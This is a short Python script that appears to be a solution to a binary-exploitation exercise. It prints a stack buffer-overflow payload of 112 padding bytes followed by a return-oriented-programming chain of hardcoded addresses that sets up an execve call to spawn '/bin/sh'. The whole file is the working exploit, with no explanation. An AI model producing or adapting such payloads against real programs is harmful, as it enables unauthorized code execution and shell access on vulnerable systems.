from shellcode import shellcode
from struct import pack

print("\xaa"*112 + pack("<I", 0x804cf26) + "\xaa"*4 + pack("<I", 0x805733a) + pack("<I", 0xBFFEA6F8) + pack("<I", 0x80497d2) + pack("<I", 0x805733a) \
	+ pack("<I", 0xBFFEA711) + pack("<I", 0x80497d2) + pack("<I", 0x805733a) + pack("<I", 0xBFFEA6F4) + pack("<I", 0x80497d2) + pack("<I", 0x8057360) + "\xed"*4 + \
	"\xec"*4 + pack("<I", 0xbffea730) +  pack("<I", 0x8050f8d) + pack("<I", 0x8050f8d) + pack("<I", 0x8050f89) + pack("<I", 0x8057ae0) + "\x0b"*8 + "/bin/sh")

# 0xbffea723